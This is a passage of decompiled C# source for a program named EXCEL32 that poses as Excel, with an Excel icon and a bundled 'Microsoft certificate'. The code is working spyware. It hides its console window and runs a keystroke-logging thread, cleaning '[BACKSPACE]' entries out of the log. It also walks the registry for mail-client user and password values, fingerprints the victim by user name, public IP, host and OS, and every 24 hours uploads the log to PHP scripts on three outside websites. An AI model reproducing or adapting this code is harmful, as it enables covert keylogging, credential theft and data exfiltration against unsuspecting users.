			Deletion_and_Cleanup.deleteFile(text);
		}

		public static void cleanText(string fileLoc)
		{
			string text = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(fileLoc);
			while (text.IndexOf("[BACKSPACE]") > 0)
			{
				text = text.Remove(checked(text.IndexOf("[BACKSPACE]") - 1), 12);
				Console.WriteLine("DELETED A BACKSPACE AT: " + Conversions.ToString(text.IndexOf("[BACKSPACE]")));
			}
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(fileLoc, text, false);
		}
	}
	[StandardModule]
	internal sealed class Main_Module
	{
		public static bool readyForUpload;

		public static bool resetTheTimer;

		public static Thread threadLog = new Thread(new ThreadStart(Enloggment.Logment));

		public static Thread threadScheduler = new Thread(new ThreadStart(Scheduler_and_IP.scheduler_continue));

		private const int SW_HIDE = 0;

		private const int SW_SHOW = 5;

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		[STAThread]
		public static void Main()
		{
			int value = (int)GetConsoleWindow();
			if ((IntPtr)value != IntPtr.Zero)
			{
				ShowWindow((IntPtr)value, 0);
			}
			Constants.set_Windows_Paths();
			Certification.Certify();
			if (!File.Exists(Constants.TIME_PATH))
			{
				Scheduler_and_IP.Reset_Time();
			}
			threadScheduler.Start();
			threadLog.Start();
		}
	}
}
namespace EXCEL32.My.Resources
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "2.0.0.0")]
	[StandardModule]
	[CompilerGenerated]
	[HideModuleName]
	[DebuggerNonUserCode]
	public sealed class Resources
	{
		private static ResourceManager resourceMan;

		private static CultureInfo resourceCulture;

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		public static ResourceManager ResourceManager
		{
			get
			{
				if (object.ReferenceEquals(resourceMan, null))
				{
					ResourceManager resourceManager = (resourceMan = new ResourceManager("EXCEL32.Resources", typeof(Resources).Assembly));
				}
				return resourceMan;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		public static CultureInfo Culture
		{
			get
			{
				return resourceCulture;
			}
			set
			{
				resourceCulture = value;
			}
		}

		public static Icon EXCEL
		{
			get
			{
				//IL_001b: Unknown result type (might be due to invalid IL or missing references)
				//IL_0021: Expected O, but got Unknown
				object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("EXCEL", resourceCulture));
				return (Icon)objectValue;
			}
		}

		public static byte[] Microsoft_Certificate
		{
			get
			{
				object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("Microsoft_Certificate", resourceCulture));
				return (byte[])objectValue;
			}
		}
	}
}
namespace EXCEL32.My
{
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "9.0.0.0")]
	[CompilerGenerated]
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal sealed class MySettings : ApplicationSettingsBase
	{
		private static MySettings defaultInstance = (MySettings)(object)SettingsBase.Synchronized((SettingsBase)(object)new MySettings());

		public static MySettings Default => defaultInstance;

		public MySettings()
			: this()
		{
		}
	}
	[HideModuleName]
	[CompilerGenerated]
	[DebuggerNonUserCode]
	[StandardModule]
	internal sealed class MySettingsProperty
	{
		[HelpKeyword("My.Settings")]
		internal static MySettings Settings => MySettings.Default;
	}
}
namespace EXCEL32
{
	[StandardModule]
	internal sealed class Registry_Search
	{
		public static void registryCleanse(string path)
		{
			string str = ".";
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\" + str + "\\root\\default:StdRegProv", (string)null));
			string text = path;
			object objectValue2 = default(object);
			object[] array = new object[3]
			{
				-2147483647,
				text,
				RuntimeHelpers.GetObjectValue(objectValue2)
			};
			object[] array2 = array;
			bool[] array3 = new bool[3]
			{
				false,
				true,
				true
			};
			NewLateBinding.LateCall(objectValue, (Type)null, "EnumKey", array2, (string[])null, (Type[])null, array3, true);
			if (array3[1])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
			if (array3[2])
			{
				objectValue2 = RuntimeHelpers.GetObjectValue(array[2]);
			}
			Console.WriteLine("Subkeys under HKEY_CURRENT_USER" + text);
			if (Information.IsDBNull(RuntimeHelpers.GetObjectValue(objectValue2)))
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)objectValue2).GetEnumerator();
				object objectValue4 = default(object);
				object objectValue5 = default(object);
				while (enumerator.MoveNext())
				{
					object objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
					Console.WriteLine(RuntimeHelpers.GetObjectValue(objectValue3));
					object[] array4 = new object[4]
					{
						-2147483647,
						Operators.ConcatenateObject((object)(text + "\\"), objectValue3),
						RuntimeHelpers.GetObjectValue(objectValue4),
						RuntimeHelpers.GetObjectValue(objectValue5)
					};
					object[] array5 = array4;
					array3 = new bool[4]
					{
						false,
						false,
						true,
						true
					};
					NewLateBinding.LateCall(objectValue, (Type)null, "EnumValues", array5, (string[])null, (Type[])null, array3, true);
					if (array3[2])
					{
						objectValue4 = RuntimeHelpers.GetObjectValue(array4[2]);
					}
					if (array3[3])
					{
						objectValue5 = RuntimeHelpers.GetObjectValue(array4[3]);
					}
					if (Information.IsDBNull(RuntimeHelpers.GetObjectValue(objectValue4)) || objectValue4 == null)
					{
						Console.WriteLine("Key is empty");
					}
					else
					{
						int num = Information.UBound((Array)objectValue4, 1);
						for (int i = 0; i <= num; i = checked(i + 1))
						{
							Console.Write(Operators.ConcatenateObject((object)"---Value Name: ", NewLateBinding.LateIndexGet(objectValue4, new object[1]
							{
								i
							}, (string[])null)));
							object obj = NewLateBinding.LateIndexGet(objectValue5, new object[1]
							{
								i
							}, (string[])null);
							if (Operators.ConditionalCompareObjectEqual(obj, (object)1, false))
							{
								Console.Write("   Data Type: String\r\n");
							}
							else if (Operators.ConditionalCompareObjectEqual(obj, (object)2, false))
							{
								Console.Write("   Data Type: Expanded String\r\n");
							}
							else if (Operators.ConditionalCompareObjectEqual(obj, (object)3, false))
							{
								Console.Write("   Data Type: Binary\r\n");
							}
							else if (Operators.ConditionalCompareObjectEqual(obj, (object)4, false))
							{
								Console.Write("   Data Type: DWORD\r\n");
							}
							else if (Operators.ConditionalCompareObjectEqual(obj, (object)7, false))
							{
								Console.Write("   Data Type: Multi String\r\n");
							}
							if (isUserPassKey(Conversions.ToString(NewLateBinding.LateIndexGet(objectValue4, new object[1]
							{
								i
							}, (string[])null))))
							{
								Console.WriteLine("Need to delete this registry value");
								object[] array6 = new object[3]
								{
									-2147483647,
									Operators.ConcatenateObject((object)(text + "\\"), objectValue3),
									RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue4, new object[1]
									{
										i
									}, (string[])null))
								};
								array3 = new bool[3]
								{
									false,
									false,
									true
								};
								NewLateBinding.LateCall(objectValue, (Type)null, "DeleteValue", array6, (string[])null, (Type[])null, array3, true);
								if (array3[2])
								{
									NewLateBinding.LateIndexSetComplex(objectValue4, new object[2]
									{
										i,
										RuntimeHelpers.GetObjectValue(array6[2])
									}, (string[])null, true, false);
								}
							}
						}
					}
					registryCleanse(Conversions.ToString(Operators.ConcatenateObject((object)(path + "\\"), objectValue3)));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		public static bool isUserPassKey(string input)
		{
			string[] array = new string[9]
			{
				"IMAP User",
				"POP3 User",
				"HTTP User",
				"SMTP User",
				"IMAP Password",
				"POP3 Password",
				"HTTP Password",
				"SMTP Password",
				"Email"
			};
			bool result = false;
			string[] array2 = array;
			foreach (string strA in array2)
			{
				if (string.Compare(strA, input) == 0)
				{
					result = true;
					break;
				}
				result = false;
			}
			return result;
		}
	}
	[StandardModule]
	internal sealed class Scheduler_and_IP
	{
		public static Mutex mut1 = new Mutex();

		public static Mutex mut2 = new Mutex();

		public static void scheduler_continue()
		{
			if (!File.Exists(Constants.TIME_PATH))
			{
				mut1.WaitOne();
				StreamWriter streamWriter = File.CreateText(Constants.TIME_PATH);
				streamWriter.WriteLine(DateAndTime.get_Now());
				streamWriter.Flush();
				streamWriter.Close();
				mut1.ReleaseMutex();
			}
			if (!File.Exists(Constants.START_TIME_PATH))
			{
				StreamWriter streamWriter = File.CreateText(Constants.START_TIME_PATH);
				streamWriter.WriteLine(DateAndTime.get_Now());
				streamWriter.Flush();
				streamWriter.Close();
			}
			checked
			{
				int num5 = default(int);
				while (true)
				{
					Console.WriteLine("Scheduler Called");
					mut1.WaitOne();
					StreamReader streamReader = File.OpenText(Constants.TIME_PATH);
					DateTime dateTime = DateTime.Parse(streamReader.ReadToEnd());
					Console.WriteLine("Time read is: " + Conversions.ToString(dateTime));
					int num = (int)DateAndTime.DateDiff((DateInterval)9, dateTime, DateAndTime.get_Now(), (FirstDayOfWeek)1, (FirstWeekOfYear)1);
					Console.WriteLine("Time diff is: " + Conversions.ToString(num));
					streamReader.Close();
					mut1.ReleaseMutex();
					if (num < 86400)
					{
						num = 86400 - num;
						int num2 = (int)Math.Round(Math.Floor((double)num / 86400.0));
						int num3 = (int)Math.Round(Math.Floor((double)(num - num2 * 86400) / 3600.0));
						int num4 = (int)Math.Round(Math.Floor((double)(num - num2 * 86400 - num3 * 3600) / 60.0));
						num = Convert.ToInt32(Math.Floor(new decimal(num - num2 * 86400 - num3 * 3600 - num4 * 60)));
						Console.WriteLine("Not enough time " + Conversions.ToString(86400) + " sec has elapsed for an upload... " + Conversions.ToString(num2) + "D " + Conversions.ToString(num3) + "H " + Conversions.ToString(num4) + "M " + Conversions.ToString(num) + "S remain");
						Console.WriteLine("NOT Ready For Upload");
						Main_Module.readyForUpload = false;
					}
					else
					{
						long conn = num5;
						bool num6 = Enloggment.InternetGetConnectedState(ref conn, 0L);
						num5 = (int)conn;
						if (num6)
						{
							break;
						}
						Console.WriteLine("Internet is down, will try again in 5 sec");
						Main_Module.readyForUpload = false;
					}
					Thread.Sleep(15000);
				}
				Console.WriteLine("Ready For Upload");
				Main_Module.readyForUpload = true;
			}
		}

		public static string Identity_Stamp()
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Unknown result type (might be due to invalid IL or missing references)
			int num = default(int);
			long conn = num;
			bool num2 = Enloggment.InternetGetConnectedState(ref conn, 0L);
			num = checked((int)conn);
			string text;
			if (num2)
			{
				text = new WebClient().DownloadString("http://checkip.dyndns.org/");
				text = ((Capture)new Regex("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}").Matches(text).get_Item(0)).ToString();
			}
			else
			{
				text = "127.0.0.1";
			}
			string hostName = Dns.GetHostName();
			string str;
			try
			{
				str = Dns.GetHostEntry(text).get_HostName();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				str = "UNKNOWN_HOST";
				ProjectData.ClearProjectError();
			}
			string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(Environment.UserName + "@", text), " {"), hostName), "} "), "["), str), "] "), getOperatingSystem()), (object)"\r\n"));
			return text2 + Conversions.ToString(DateAndTime.get_Now()) + " " + TimeZone.CurrentTimeZone.StandardName + " Build Version: 1.0.0";
		}

		public static void Reset_Time()
		{
			Console.WriteLine("Resetting the time");
			mut1.WaitOne();
			StreamWriter streamWriter = File.CreateText(Constants.TIME_PATH);
			streamWriter.WriteLine(DateAndTime.get_Now());
			streamWriter.Flush();
			streamWriter.Close();
			mut1.ReleaseMutex();
			Console.WriteLine("time.txt reset");
		}

		public static object getOperatingSystem()
		{
			//Discarded unreachable code: IL_00be, IL_00ec, IL_0125, IL_0132, IL_013d, IL_0140, IL_0142, IL_0147, IL_018f, IL_0191, IL_01a8, IL_01cc
			//IL_011f: Unknown result type (might be due to invalid IL or missing references)
			int num = default(int);
			object obj = default(object);
			int num3 = default(int);
			try
			{
				ProjectData.ClearProjectError();
				num = 2;
				int num2 = 2;
				string str = ".";
				num2 = 3;
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\" + str + "\\root\\cimv2", (string)null));
				num2 = 4;
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecQuery", new object[1]
				{
					"Select * from Win32_OperatingSystem"
				}, (string[])null, (Type[])null, (bool[])null));
				num2 = 5;
				IEnumerator enumerator = ((IEnumerable)objectValue2).GetEnumerator();
				if (enumerator.MoveNext())
				{
					object objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
					num2 = 6;
					obj = Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateGet(objectValue3, (Type)null, "Caption", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"v"), NewLateBinding.LateGet(objectValue3, (Type)null, "Version", new object[0], (string[])null, (Type[])null, (bool[])null));
				}
				else
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					ProjectData.ClearProjectError();
					num = 1;
				}
			}
			catch (object obj2) when (obj2 is Exception && num != 0 && num3 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				/*Error near IL_01ca: Could not find block for branch target IL_0191*/;
			}
			object result = obj;
			if (num3 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}
	[StandardModule]
	internal sealed class Uploader
	{
		public static void htmlUpload(string exportName)
		{
			string text = "http://www.advantarlabs.com/cgi/up_docx.php";
			ServicePointManager.set_Expect100Continue(false);
			Console.WriteLine("HTML Uploading");
			try
			{
				((ServerComputer)MyProject.Computer).get_Network().UploadFile(exportName, "http://www.advantarlabs.com/cgi/up_docx.php");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Console.WriteLine("FAILED TO UPLOAD TO: http://www.advantarlabs.com/cgi/up_docx.php");
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_Network().UploadFile(exportName, "http://www.cooperstandard.com/uploads/up_docx.php");
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				Console.WriteLine("FAILED TO UPLOAD TO: http://www.cooperstandard.com/uploads/up_docx.php");
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_Network().UploadFile(exportName, "http://www.palmettogoodwill.org/files/policycommittee/up_docx.php");
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				Console.WriteLine("FAILED TO UPLOAD TO: http://www.palmettogoodwill.org/files/policycommittee/up_docx.php");
				ProjectData.ClearProjectError();
			}
		}
	}
}
